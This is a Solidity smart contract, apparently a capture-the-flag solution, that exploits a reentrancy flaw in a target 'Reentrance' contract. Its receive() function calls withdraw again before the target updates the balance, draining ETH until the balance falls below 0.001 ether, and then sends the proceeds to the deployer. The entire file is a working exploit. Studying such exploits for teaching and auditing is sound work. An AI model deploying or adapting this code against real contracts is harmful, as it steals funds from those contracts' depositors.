// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

import "./Reentrance.sol";

contract ReentranceHacker {
    IReentrance public reentrance;
    address public owner;

    constructor(address _reentranceAddress) {
        reentrance = IReentrance(_reentranceAddress);
        owner = msg.sender;
    }

    // Start the attack by depositing some ETH, then withdrawing
    function attack() public payable {
        require(msg.value >= 0.001 ether, "Send at least 0.001 ETH");
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    function sendBack(address to) public {
        payable(to).transfer(address(this).balance);
    }

    // This is called when EtherStore sends us ETH
    receive() external payable {
        uint256 myCurrentBalance = reentrance.balanceOf(address(this));
        if (myCurrentBalance >= 0.001 ether) {
            reentrance.withdraw(myCurrentBalance); // 🔁 re-enter before balances[msg.sender] = 0
        } else {
            // Finished draining, send funds to owner
            payable(owner).transfer(address(this).balance);
        }
    }
}
